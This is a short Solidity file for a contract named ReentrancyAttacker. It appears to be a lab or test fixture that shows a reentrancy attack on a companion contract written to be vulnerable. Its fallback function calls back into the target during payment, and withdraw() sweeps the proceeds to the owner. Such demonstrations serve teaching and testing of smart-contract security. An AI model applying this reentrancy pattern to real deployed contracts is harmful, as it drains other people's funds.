pragma solidity >0.4.99 <0.6.0;

import "./ReentrancyVulnerable.sol";

contract ReentrancyAttacker {
  address payable private _owner;
  ReentrancyVulnerable private _vulnerable;

  constructor(address vulnerable) public {
    _owner = msg.sender;
    _vulnerable = ReentrancyVulnerable(vulnerable);
  }

  modifier onlyOwner {
    require(msg.sender == _owner);
    _;
  }

  function () payable external {
    _vulnerable.transfer(_owner, msg.value);
  }

  function deposit() payable public onlyOwner {
    _vulnerable.deposit.value(msg.value)();
  }

  function withdraw() public onlyOwner {
    _vulnerable.withdraw();
    _owner.transfer(address(this).balance);
  }
}
